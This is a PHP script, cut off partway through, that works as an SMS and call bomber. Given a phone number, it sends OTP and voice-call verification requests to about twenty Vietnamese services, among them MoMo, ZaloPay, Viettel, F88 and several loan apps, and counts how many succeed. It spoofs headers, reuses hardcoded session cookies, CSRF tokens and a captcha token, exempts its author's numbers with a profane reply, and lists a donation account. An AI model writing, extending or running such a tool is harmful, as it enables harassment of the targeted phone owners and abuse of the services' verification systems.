<?php
header('content-type: application/json');
$sdt = $_GET["phone"];
if(strlen($sdt) < 10){
	echo ECHOJSON(array("status" => "error","msg" => "Vui Lòng Nhập Đúng Số Phone")); exit;
} else if(!$sdt){
	echo ECHOJSON(array("status" => "error","msg" => "Vui Lòng Nhập Đúng Số Phone")); exit;
} else if($sdt == "0338342654" or $sdt =="0329017410" or $sdt == "0833823392" or $sdt == "0796110078"){
	echo ECHOJSON(array("msg" => "SPAM CÁI LỒN ĐỊT CON MẸ MÀY")); exit;
}
$MONEYVEO = MONEYVEO($sdt);/// otp callllll
$VAYVND = VAYVND($sdt);///send otp/////////
$ROBOCASH = ROBOCASH($sdt);/// otp callllll//
$LOSHIP = LOSHIP($sdt);//send otp
$TUOITRE = TUOITRE($sdt);///send otp
$ATM = ATM($sdt);///send otp
$VIEON = VIEON($sdt);//send otp
$DONGPLUS = DONGPLUS($sdt);///otp call
$TIENOI = TIENOI($sdt);//otp call
$F88 = F88($sdt);//send otp
$TAMO = TAMO($sdt);///send otp
$META = META($sdt);///send otp
$VIETTELL = VIETTELL($sdt);///send otp
$VETTELL2 = VETTELL2($sdt);//send otp
$ZALOPAY = ZALOPAY($sdt);//send otp
$VTPAY = VTPAY($sdt);///send otp
$MOMO = MOMO($sdt);//otp call
$FPTSHOP = FPTSHOP($sdt);//send otp
$TV360 = TV360($sdt);//send otp
$POPS = POPS($sdt);//send otp
$array = array(
	"MOMO" => $MOMO["MOMO"],
	"META_VN" => $META["META"],
	"FPTSHOP" => $FPTSHOP["FPTSHOP"],
	"TV360" => $TV360["TV360"],
	"ATM" => $ATM["ATM"],
	"F88" => $F88["F88"],
	"LOSHIP" => $LOSHIP["LOSHIP"],
	"ZALOPAY" => $ZALOPAY["ZALOPAY"],
	"MONEYVEO" => $MONEYVEO["MONEYVEO"],//call
	"TIENOI" => $TIENOI["TIENOI"],
	"VIETTELL" => $VIETTELL["VIETTEL"],
	"VT2" => $VETTELL2["VT.VN"],
	"VIETTELLPAY" => $VTPAY["VTPAY"],
	"TAMO" => $TAMO["TAMO"],
	"VAYVND" => $VAYVND["VAYVND"],
	"TT" => $TUOITRE["TT"],
	"DONGPLUS" => $DONGPLUS["DONGPLUS"],
	"POPS" => $POPS["POPS"],
	"VIEON" => $VIEON["VIEON"],
	"VERSION" => "1.2.0",
      "DONATE" => "MBBANK 5000002007",
);
if($ATM["ATM"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($VAYVND["VAYVND"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($LOSHIP["LOSHIP"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($F88["F88"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($MOMO["MOMO"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($VETTELL2["VT.VN"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($TAMO["TAMO"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($ZALOPAY["ZALOPAY"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($TIENOI["TIENOI"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($META["META"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($FPTSHOP["FPTSHOP"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($TV360["TV360"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($VIETTELL["VIETTEL"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($MONEYVEO["MONEYVEO"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($DONGPLUS["DONGPLUS"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($POPS["POPS"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($TUOITRE["TT"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($VTPAY["VTPAY"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
if($VIEON["VIEON"] == "Thành Công"){
	$dem ++;
} else {
	$error ++;
}
$data = array(
	"REQUESTS" => "20",
	"SUCCESS" => $dem,
	"ERROR" => $error,
	"DATA-OPT" => $array
);
echo json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT); 





















//otp call
function MONEYVEO($sdt){
	$head = array(
		"Host: moneyveo.vn",
		"accept: */*",
		"x-requested-with: XMLHttpRequest",
		"traceparent: 00-".generateRandomString(strlen("c771ff34b940c30df615b678478fce28"))."-".generateRandomString(strlen("1e0ba42c6725b148"))."-00",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded; charset=UTF-8",
		"referer: https://moneyveo.vn/vi/registernew/",
	);
	$get = CURL("GET", "https://moneyveo.vn/vi/registernew/", null, $head, true);
	$ck = explode(";", explode("set-cookie: ", $get)[1])[0].";";
	$data = 'phoneNumber='.$sdt;
	$head = array(
		"Host: moneyveo.vn",
		"accept: */*",
		"x-requested-with: XMLHttpRequest",
		"traceparent: 00-".generateRandomString(strlen("c771ff34b940c30df615b678478fce28"))."-".generateRandomString(strlen("1e0ba42c6725b148"))."-00",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded; charset=UTF-8",
		"referer: https://moneyveo.vn/vi/registernew/",
		"cookie: ".$ck
	);
	$access = json(CURL("POST", "https://moneyveo.vn/vi/registernew/sendsmsjson/", $data, $head, false));
	if($access["succeed"] == "true" or $GET["succeed"] == 1){
		return array("MONEYVEO" => "Thành Công");
	} else {
		return array("MONEYVEO" => "Thất Bại");
	}
}
//otp ///
function VAYVND($sdt){
	$head = array(
		"Host: api.vayvnd.vn",
		"accept: application/json",
		"accept-language: vi",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://vayvnd.vn",
		"referer: https://vayvnd.vn/",
	);
	$data = '{
  "phone": "'.$sdt.'",
  "utm_campaign": "null",
  "cpa_id": 7,
  "cpa_lead_data": {
    "click_id": "'.generateImei().'",
    "source_id": "source_6",
    "utm_score": "0.0'.generateRandomstr(strlen("13672266155481339")).'"
  },
  "utm_list": [
    {
      "utm_source": "jeffapp"
    }
  ],
  "source_site": 1,
  "reg_screen_resolution": {
    "width": 412,
    "height": 915
  }
}';
	$GET = json(CURL("POST", "https://api.vayvnd.vn/v1/users", $data, $head, false));
	if($GET["data"]["id"]){
		return array("VAYVND" => "Thành Công");
	} else {
		$data = '{"login":"'.$sdt.'"}';
		$GET = json(CURL("POST", "https://api.vayvnd.vn/v1/users/password-reset", $data, $head, false));
		if($GET["result"] == 1 or $GET["result"] == "true") {
			return array("VAYVND" => "Thành Công");
		} else {
			return array("VAYVND" => "Thất Bại");
		}
	}
}
//otp call
function ROBOCASH($sdt){
	$head = array(
		"Host: robocash.vn",
		"cache-control: max-age=0",
		"upgrade-insecure-requests: 1",
		"origin: https://robocash.vn",
		"content-type: application/x-www-form-urlencoded",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"referer: https://robocash.vn/?utm_source=seo&utm_term=https://robocash.vn/vay-tien-nhanh",
		"cookie: __cfruid=96b1c440a99f8a9b4500db9003fba029530f7efd-1681472457;_fbp=fb.1.1681472466567.1755259407;ec_png_utm=7df928dd-d32f-9b30-de56-3fdc350de09b;ec_etag_utm=7df928dd-d32f-9b30-de56-3fdc350de09b;ec_cache_utm=7df928dd-d32f-9b30-de56-3fdc350de09b;uid=7df928dd-d32f-9b30-de56-3fdc350de09b;ec_png_client=false;ec_etag_client=false;ec_cache_client=false;client=false;ec_png_client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3Anull%7D;ec_etag_client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3Anull%7D;ec_cache_client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3Anull%7D;client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3Anull%7D;XSRF-TOKEN=eyJpdiI6IjF3ZS9oVzgzNm44dERDZTZvc05ubVE9PSIsInZhbHVlIjoiM0FrclFqU1V2RDVrMFdlOUFoNmlQUzN4c1U4SWVUWFViUm41cDcyWWkyQ0VaaWg2WUtMQVVDZm9nNlQyNWV4dHhTME45QTdNdlFwZ2t4R0ZLWFd6RXJRKzNkSE9WOTV2SE1NWlhneGw0RXl1Q3M4SWZaR1RuUGJtVlBhVzhMTnIiLCJtYWMiOiJlNjE2YTZhNGYyN2VlZTA0YjU2NGIwYjlhOTAxZjUyM2E3Y2NhZDkwZTRjZTRlOWFkNWNlNDZiODQ3YjM2ZWIyIiwidGFnIjoiIn0%3D;sessionid=eyJpdiI6IjRGN1A0UEJFRE8wbTRqUlNrdzhKWUE9PSIsInZhbHVlIjoieXNzOEIrbXMxR0l4R0FSZGtSN1hBUnduUy94ak1jQzhZdEViUGdhTkNKWG1aVThqd1NzY0pVVGhvRjk2L0RpNk40UEZZcnhESU12U3U5bGRGdnVSN1JPYzNHZUpYRUg2RDlvajh6MGNINVB2MEdDWDBXeXZOYzcveXFBMHF5OUciLCJtYWMiOiJkYTNiM2U4ZGQ2NDdjNTA3MGE5Y2RhOGQ2YTkwNTU4YjI4MTI0MDA0MDRkYWY5MTA4MmQzMWQ1ZTcxMzc5MjQxIiwidGFnIjoiIn0%3D;utm_uid=eyJpdiI6ImF4cTdnZGsyNVNGemtpTDJ0N05oR0E9PSIsInZhbHVlIjoicWo5eG1YRUIrSzhHeVE4L0hKYlBBN0k4bnpKaDNQcTk3cEVQNmNjZTgrMWN0ejQ3bk9kbW1Ndkl4dEd5R2JSZW02cmtjRlpmN3V2Y1p3clVzek1qUmN6RHRCam5ybkljRG81R0NZNzREVFNKUkFYM0hiM1VsbGEySVFDczBROWYiLCJtYWMiOiJhZTQzZmNlYjEzYmMzN2Q3ZWUxNjQ1NDM1Y2ZlOGU5OTVlODJlYzg1MjVlNjViN2Y2NWM2M2I4ZjVkNzE4ZTkwIiwidGFnIjoiIn0%3D"
	);
	$GET = CURL("GET", "https://robocash.vn/?utm_source=seo&utm_term=https://robocash.vn/vay-tien-nhanh", null, $head, false);
	$token = explode('"', explode('name="_token" value="', $GET)[1])[0];
	$data = "_token=".$token."&_token=".$token."&amount=5+000+000&term=14&phone=".$sdt;
	$GET = CURL("POST", "https://robocash.vn/guest/application/create", $data, $head, false);
}
//otp
function LOSHIP($sdt){
	$a = "84". $sdt;
	$usersdt = explode("840", $a)[1];
	$head = array(
		"Host: latte.lozi.vn",
		"accept-language: vi_VN",
		"x-access-token: unknown",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://loship.vn",
		"referer: https://loship.vn/",
	);
	$data = '{"device":"Android 12","platform":"Chrome WebView/96.0.4664.104","countryCode":"84","phoneNumber":"'.$sdt.'"}';
	$GET = CURL("POST", "https://latte.lozi.vn/v1.2/auth/register/phone/initial", $data, $head,false);
	if (strpos ($GET, $usersdt) !== false){
		return array("LOSHIP" => "Thành Công");
	} else {
		return array("LOSHIP" => "Thất Bại");
	}
}
//otp
function TUOITRE($sdt){
	$head = array(
		"Host: tuoitre.vn",
		"accept: application/json, text/plain, */*",
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: multipart/form-data; boundary=----WebKitFormBoundary6tasV7gdCXo1XomC",
		"origin: https://sso.tuoitre.vn",
		"cookie: _ttsid=2585aa59f50b946ccae21ac9ec87353395a8893412ea53150a8e6dc0d1c15841;XSRF-TOKEN=eyJpdiI6IldLQ3J0bkp6bVJUWk4yajBkd1RQZkE9PSIsInZhbHVlIjoiclUwb25DWW5YNmFmbXpqMDJZVjBpcHVGZVdOdmdQeG9sZ0tUd3dMUjc4L3RWNkd3NGdaNzMvVFRMTlQwcm5kZ3B6TGZYS3R4SlNvQVlXcksyR3JISUl0R3VwYzZCOFY5Q242akFmL1hSTXhpTEx1OWpQeXlTY01jOFR1bzlES08iLCJtYWMiOiJlMTNjMDk2MWRhMDZlNDJjMjAyZTg2MWI1N2Y0NzljNDQ3MGM0YjQ2ZTEzMGVkMzFiNjBhNjZiNWU2MjIwYjc5IiwidGFnIjoiIn0%3D;SSO_SID=eyJpdiI6ImFHK0NycmxqYVRPV0lDUXZYTSttdkE9PSIsInZhbHVlIjoiTm5TMDNJVlVMdGxYelBWNWlzSFNselhsTG9RV1BYRWNvWXpHVjE4djJsTWlxS2d2dmF6Zk1EZGlCekVTbzRNc2xSclc5MmJvVkVGRWp4aUpjMUFjQ2lVRWNBRVhHbkdmTzdTQzRPTlp6clF6eUczNGk0Y2xHRkEwaXhUbitTbk8iLCJtYWMiOiJhNjNjYjlmNTA1YjNmYmJiMDJkMjMyZmFkOGE2NzYyMTQ3NzY4ZmNiYzA5MDg4M2ExZmYxNWZlMzY0ZjM2NGU3IiwidGFnIjoiIn0%3D"
	);
	$get = CURL("GET", "https://tuoitre.vn", null, $head, false);
	$token_a = explode("'", explode("VideoToken: '", $get)[1])[0];
	$head = array(
		"Host: sso.tuoitre.vn",
		"accept: application/json, text/plain, */*",
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: multipart/form-data; boundary=----WebKitFormBoundary6tasV7gdCXo1XomC",
		"origin: https://sso.tuoitre.vn",
		"sec-fetch-site: same-origin",
		"sec-fetch-mode: cors",
		"sec-fetch-dest: empty",
		"cookie: _ttsid=2585aa59f50b946ccae21ac9ec87353395a8893412ea53150a8e6dc0d1c15841;XSRF-TOKEN=eyJpdiI6IldLQ3J0bkp6bVJUWk4yajBkd1RQZkE9PSIsInZhbHVlIjoiclUwb25DWW5YNmFmbXpqMDJZVjBpcHVGZVdOdmdQeG9sZ0tUd3dMUjc4L3RWNkd3NGdaNzMvVFRMTlQwcm5kZ3B6TGZYS3R4SlNvQVlXcksyR3JISUl0R3VwYzZCOFY5Q242akFmL1hSTXhpTEx1OWpQeXlTY01jOFR1bzlES08iLCJtYWMiOiJlMTNjMDk2MWRhMDZlNDJjMjAyZTg2MWI1N2Y0NzljNDQ3MGM0YjQ2ZTEzMGVkMzFiNjBhNjZiNWU2MjIwYjc5IiwidGFnIjoiIn0%3D;SSO_SID=eyJpdiI6ImFHK0NycmxqYVRPV0lDUXZYTSttdkE9PSIsInZhbHVlIjoiTm5TMDNJVlVMdGxYelBWNWlzSFNselhsTG9RV1BYRWNvWXpHVjE4djJsTWlxS2d2dmF6Zk1EZGlCekVTbzRNc2xSclc5MmJvVkVGRWp4aUpjMUFjQ2lVRWNBRVhHbkdmTzdTQzRPTlp6clF6eUczNGk0Y2xHRkEwaXhUbitTbk8iLCJtYWMiOiJhNjNjYjlmNTA1YjNmYmJiMDJkMjMyZmFkOGE2NzYyMTQ3NzY4ZmNiYzA5MDg4M2ExZmYxNWZlMzY0ZjM2NGU3IiwidGFnIjoiIn0%3D"
	);
	$get = CURL("GET", "https://sso.tuoitre.vn/otp?redirectUrl=https://tuoitre.vn/&state=eyJ".$token_a, null, $head, false);
	$token_b = explode('"', explode('name="csrf-token" content="', $get)[1])[0];
	$head = array(
		"Host: sso.tuoitre.vn",
		"accept: application/json, text/plain, */*",
		"x-xsrf-token: eyJ".$token_a,
		"x-csrf-token: ".$token_b,
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: multipart/form-data; boundary=----WebKitFormBoundary6tasV7gdCXo1XomC",
		"origin: https://sso.tuoitre.vn",
		"referer: https://sso.tuoitre.vn/otp?redirectUrl=https%3A%2F%2Ftuoitre.vn%2Fvay-tien-qua-app-qua-nhanh-qua-nguy-hiem-20190703082332659.htm&state=eyJpdiI6IlU5Y1p0Y3NpVTBtdkF5K29zNHM2SGc9PSIsInZhbHVlIjoiRVN6TjlscXZ4SmtCUW5WYkdoM1M2emJWc216Q1RrQlNFK1FWR3dXTC9DSDdBQ3gwa3FuYmQ1YlBjQlFzMXYvSHo3cHIvaHFScWZtMUZPV284S3JqalhCRzZNNDFIb2EyVldYd3VYZ2pleHJHTzR3bVhEb2pxRGtua2s4bHFNcS90YjlaL09URWVUSG5uQnJSREhNNUlRalAyVG05c2E5dVFTUWE0aG9Tb21lNytFVnVuVWxwQ1ZzNEFsVVdhbTNhcVlaL3ZZVm10Rzczc2xwWWV5eDFjcks5dDBSM3FNczAzNi8yb09YM2lBQ2F2eXN6UHVhTnFoUXNjNTFhaUQyeS9HNmpLQ2crcFh6WDQzTTFsa2R6R04rY1QyYmpvOFBtNDAvZ2w0amVKVWk0bEtNQzlnQUFBaFFIRFQ3REdjR2pMNjI1TG4ycTVmK3E4T004MmgweXE2TFNUSEZYMTRwWEF1VnFtUzBMeG9iTHVaTVd4MEVWUUpGRFAxbkVlMC9XIiwibWFjIjoiNjVjMThmNGY4YjYyMzdlNGZkNDA2NTlmMzVkZTQ2MjgwNzUyOTc3YWE4NzBmZjE5YTQxY2Y2NTQ4NTA4YTQwZiIsInRhZyI6IiJ9",
		"cookie: _ttsid=2585aa59f50b946ccae21ac9ec87353395a8893412ea53150a8e6dc0d1c15841;XSRF-TOKEN=eyJpdiI6IldLQ3J0bkp6bVJUWk4yajBkd1RQZkE9PSIsInZhbHVlIjoiclUwb25DWW5YNmFmbXpqMDJZVjBpcHVGZVdOdmdQeG9sZ0tUd3dMUjc4L3RWNkd3NGdaNzMvVFRMTlQwcm5kZ3B6TGZYS3R4SlNvQVlXcksyR3JISUl0R3VwYzZCOFY5Q242akFmL1hSTXhpTEx1OWpQeXlTY01jOFR1bzlES08iLCJtYWMiOiJlMTNjMDk2MWRhMDZlNDJjMjAyZTg2MWI1N2Y0NzljNDQ3MGM0YjQ2ZTEzMGVkMzFiNjBhNjZiNWU2MjIwYjc5IiwidGFnIjoiIn0%3D;SSO_SID=eyJpdiI6ImFHK0NycmxqYVRPV0lDUXZYTSttdkE9PSIsInZhbHVlIjoiTm5TMDNJVlVMdGxYelBWNWlzSFNselhsTG9RV1BYRWNvWXpHVjE4djJsTWlxS2d2dmF6Zk1EZGlCekVTbzRNc2xSclc5MmJvVkVGRWp4aUpjMUFjQ2lVRWNBRVhHbkdmTzdTQzRPTlp6clF6eUczNGk0Y2xHRkEwaXhUbitTbk8iLCJtYWMiOiJhNjNjYjlmNTA1YjNmYmJiMDJkMjMyZmFkOGE2NzYyMTQ3NzY4ZmNiYzA5MDg4M2ExZmYxNWZlMzY0ZjM2NGU3IiwidGFnIjoiIn0%3D"
	);
	$data = '------WebKitFormBoundary6tasV7gdCXo1XomC
Content-Disposition: form-data; name="phone"

'.$sdt.'
------WebKitFormBoundary6tasV7gdCXo1XomC--';
	$access = json(CURL("POST", "https://sso.tuoitre.vn/receive-otp", $data, $head, false));
	if($access["success"] == 1){
		return array("TT" => "Thành Công");
	} else {
		return array("TT" => "Thất Bại");
	}
}
//otp
function ATM($sdt){
	$head = array(
		"Host: atmonline.vn",
		"accept: application/json, text/javascript, */*; q=0.01",
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://atmonline.vn",
		"referer: https://atmonline.vn/",
		"cookie: SESSION=".generateRandom(strlen("YmIyMjJhOTgtNGE0OS00NTgxLTg2YTYtNzk3N2FhNDM2ZTI1")).";DESIGN_TYPE=NEW;_fw_crm_v=".generateImei()
	);
	$data = '{"mobilePhone":"'.$sdt.'","source":"ONLINE"}';
	$GET = json(CURL("POST", "https://atmonline.vn/back-office/api/json/auth/sendAcceptanceCode", $data, $head, false));
	if($GET["actionIdentifier"]){
		return array("ATM" => "Thành Công");
	} else {
		return array("ATM" => "Thất Bại");
	}
}
//otp
function VIEON($sdt){
	$head = array(
		"Host: vieon.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded",
		"origin: https://vieon.vn",
		"referer: https://vieon.vn/",
	);
	$access = CURL("GET", "https://vieon.vn/", null, $head, false);
	$token = explode('"', explode('"token":"', $access)[1])[0];
	$head = array(
		"Host: api.vieon.vn",
		"accept: application/json, text/plain, */*",
		"authorization: ".$token,
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded",
		"origin: https://vieon.vn",
		"referer: https://vieon.vn/",
	);
	$data = 'phone_number='.$sdt.'&password=123456789&given_name=&device_id=598a3da6a4b7d1450b2a247bd080ca9d&platform=mobile_web&model=Android%2012&push_token=&device_name=Chrome%2F96&device_type=desktop&ui=012021';
	$access = json(CURL("POST", "https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021", $data, $head, false));
	if($access["error"] == 400){
		$data = 'phone_number='.$sdt.'&platform=mobile_web&ui=012021';
		$access = json(CURL("POST", "https://api.vieon.vn/backend/user/forget/forget_password?platform=mobile_web&ui=012021", $data, $head, false));
	}
	if($access["register_session_id"] or $access["status"] == 1){
		return array("VIEON" => "Thành Công");
	} else {
		return array("VIEON" => "Thất Bại");
	}
}
//otp call
function DONGPLUS($sdt){
	$sdt = "84". $sdt;
	$sdt = explode("840", $sdt)[1];
	$head = array(
		"Host: api.dongplus.vn",
		"accept-language: vi",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://dongplus.vn",
		"referer: https://dongplusvn/user/login",
	);
	$data = '{"full_name":"Khang Nguyễn","first_name":"Nguyễn","last_name":"Khang","mobile_phone":"84'.$sdt.'","target_url":"https://dongplus.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct"}';
	CURL("POST", "https://api.dongplus.vn/api/user", $data, $head, false);
	$data = '{"phone":"84'.$sdt.'"}';
	$access = CURL("POST", "https://api.dongplus.vn/api/user/send-one-time-password", $data, $head, false);
	if(json_decode($access,true)["loan_processing_enabled"] == ""){
		return array("DONGPLUS" => "Thành Công");
	} else {
		return array("DONGPLUS" => "Thất Bại");
	}
}
//otp call
function TIENOI($sdt){
	$head = array(
		"Host: app.tienoi.com.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://app.tienoi.com.vn",
		"referer: https://app.tienoi.com.vn/auth/registration?need=2000000&days=14",
	);
	$data = '{"mobilePhone":"'.$sdt.'","password":"A123456789a","passwordConfirmation":"A123456789a","isVoiceSms":true}';
	$access = CURL("POST", "https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode", $data, $head, false);
	if(json($access)["id"]){
		return array("TIENOI" => "Thất Bại");
	} else {
		return array("TIENOI" => "Thành Công");
	}
}
//otp
function F88($sdt){
	$head = array(
		'Host: api.f88.vn',
		'accept: application/json, text/plain, */*',
		'content-encoding: gzip',
		'user-agent: Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36',
		'content-type: application/json',
		'origin: https://online.f88.vn',
		'referer: https://online.f88.vn/',
	);
	$data = '{"phoneNumber":"'.$sdt.'","recaptchaResponse":"03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO","source":"Online"}';
	$access = json(CURL("POST", "https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP", $data, $head, false));
	if($access["message"] == "Gửi mã OTP thành công."){
		return array("F88" => "Thành Công");
	} else {
		return array("F88" => "Thất Bại");
	}
}
//otp
function TAMO($sdt){
	$head = array(
		"Host: api.tamo.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
		"content-type: application/json;charset=UTF-8",
		"origin: https://www.tamo.vn",
		"referer: https://www.tamo.vn/",
	);
	$data = '{"mobilePhone":{"number":"'.$sdt.'"}}';
	$access = json(CURL("POST", "https://api.tamo.vn/web/public/client/phone/sms-code-ts", $data, $head, false));
	if($access["data"][0] == ""){
		return array("TAMO" => "Thành Công");
	} else {
		return array("TAMO" => "Thất Bại");
	}
}
//otp
function META($sdt){
	$head = array(
		"Host: meta.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://meta.vn",
		"referer: https://meta.vn/account/register",
		"cookie: _ssid=smfszyszu3tq5h02lmly12yz;_cart_=fc5bf0de-45de-4323-a007-f7860e71a5a1;__ckmid=262a67477e774f56b3de7e656e741682"
	);
	$data = '{"api_args":{"lgUser":"'.$sdt.'","act":"send","type":"phone"},"api_method":"CheckExist"}';
	$GET= json(CURL("POST", "https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1", $data, $head, false));
	if($GET["Status"] == "send_ok"){
		return array("META" => "Thành Công");
	} else {
		return array("META" => "Thất Bại");
	}
}
//otp
function VIETTELL($sdt){
	$head = array(
		"Host: vietteltelecom.vn",
		"Connection: keep-alive",
		"X-CSRF-TOKEN: mXy4RvYExDOIR62HlNUuGjVUhnpKgMA57LhtHQ5I",
		"User-Agent: Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
		"Content-Type: application/json;charset=UTF-8",
		"Accept: application/json, text/plain, */*",
		"Referer: https://vietteltelecom.vn/dang-nhap",
	);
	$data = array(
		"phone" => $sdt,
		"type" => ""
	);
	$GET = json(CURL("POST", "https://vietteltelecom.vn/api/get-otp-login", json_encode($data), $head, false));
	if($GET["code"] == 200){
		return array("VIETTEL" => "Thành Công");
	} else {
		return array("VIETTEL" => "Thất Bại");
	}
}
//otp
function VETTELL2($sdt){
	$head = array(
		"Host: viettel.vn",
		"Connection: keep-alive",
		"Accept: application/json, text/plain, */*",
		"X-Requested-With: XMLHttpRequest",
